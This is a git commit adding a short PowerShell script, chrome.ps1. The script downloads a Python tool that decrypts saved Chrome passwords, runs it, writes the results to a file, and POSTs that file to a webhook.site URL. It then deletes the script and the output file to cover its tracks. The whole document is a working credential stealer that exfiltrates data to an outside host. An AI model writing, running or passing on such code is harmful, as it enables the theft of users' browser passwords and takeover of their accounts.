46c1ef1757415c2f7ef1fd7555d3c11b7ee1ebde
AKASH <87299311+gamkers@users.noreply.github.com>
2024-03-31 00:17:29 +0530

    Create chrome.ps1

---
+++ chrome.ps1
@@ -0,0 +1,27 @@
+# Define the URL of the Python script
+$scriptUrl = "https://raw.githubusercontent.com/ohyicong/decrypt-chrome-passwords/main/decrypt_chrome_password.py"
+
+# Define the directory where you want to download the script
+$scriptDir = "C:\"
+$scriptPath = Join-Path -Path $scriptDir -ChildPath "decrypt_chrome_password.py"
+
+# Define the output file path
+$outputFilePath = Join-Path -Path $scriptDir -ChildPath "output.txt"
+
+# Download the Python script from GitHub
+Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+
+# Install required Python packages
+pip install pypiwin32 pycryptodome
+
+# Execute the Python script and store the output
+$output = python $scriptPath
+
+# Write the output to a file
+$output | Out-File -FilePath $outputFilePath
+
+# Send the output to the webhook URL
+Invoke-WebRequest -Uri "	https://webhook.site/809d0f5f-7467-48fc-9be5-538024059dd4" -Method POST -InFile $outputFilePath
+
+Remove-Item -Path $scriptPath
+Remove-Item -Path $outputFilePath
